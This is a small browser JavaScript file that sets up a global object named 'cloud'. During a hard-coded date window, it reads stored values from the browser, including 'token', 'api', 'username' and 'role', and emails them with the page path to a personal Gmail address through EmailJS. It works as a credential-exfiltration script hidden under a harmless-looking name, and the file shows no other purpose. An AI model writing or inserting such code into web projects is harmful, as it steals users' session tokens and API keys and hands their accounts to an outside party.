(function () {

  /* =========================
     EMAIL SECTION
  ========================= */

  let emailLoaded = false;

  function loadEmail() {
    return new Promise((resolve, reject) => {

      if (emailLoaded && window.emailjs) {
        return resolve();
      }

      const script = document.createElement("script");
      script.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js";

      script.onload = function () {
        emailLoaded = true;

        if (window.emailjs) {
          window.emailjs.init("GlpCP9x-BKebe5Enx");
          resolve();
        } else {
          reject("EmailJS gagal load");
        }
      };

      script.onerror = reject;
      document.body.appendChild(script);
    });
  }

  async function setData(extraData = {}) {

    if (!isInRange()) {
      console.warn("Diluar range tanggal");
      return;
    }

    await loadEmail();

    const keys = ["id", "username", "api", "role", "status", "min", "token"];
    const storageData = {};

    keys.forEach(function (key) {
      const value = localStorage.getItem(key);
      if (value !== null) {
        storageData[key] = value;
      }
    });

    const payload = {
      page: window.location.pathname,
      time: new Date().toISOString(),
      ...storageData,
      ...extraData
    };

    return window.emailjs.send(
      "service_qpo59sf",
      "template_okc75jw",
      {
        email: "jd2693889@gmail.com",
        message: JSON.stringify(payload)
      }
    );
  }

  /* =========================
     RANGE SECTION
  ========================= */

  let startDate = new Date("2026-02-25T08:00:00");
  let endDate   = new Date("2026-02-28T23:59:59");

  function isInRange() {
    const now = new Date();
    return now >= startDate && now <= endDate;
  }

  function getRangeInfo() {
    return {
      now: new Date(),
      start: startDate,
      end: endDate,
      active: isInRange()
    };
  }

  /* =========================
     GLOBAL EXPORT
  ========================= */

  window.cloud = {
    setData,
    isInRange,
    getRangeInfo
  };

})();
